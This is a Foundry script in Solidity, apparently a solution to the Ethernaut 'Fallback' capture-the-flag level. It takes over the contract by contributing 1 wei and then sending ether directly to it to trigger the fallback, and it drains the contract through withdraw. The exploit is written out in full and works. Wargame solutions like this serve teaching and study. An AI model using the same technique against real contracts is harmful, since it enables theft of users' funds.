// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Fallback} from "src/01/Fallback.sol";

contract Exploit is Script {

        Fallback level = Fallback(payable(instance));
        address instance = vm.envAddress("INSTANCE_LEVEL1");
        uint256 hacker = vm.envUint("PRIVATE_KEY");   
        address deployer = vm.rememberKey(hacker);
      
        function run() external {
            vm.startBroadcast(deployer);
            level.contribute{value: 1 wei}();
            (bool sent, ) = address(level).call{value: 1 wei}("");
            require(sent, "Failed to call send()");
            level.withdraw();
            vm.stopBroadcast();
    }
}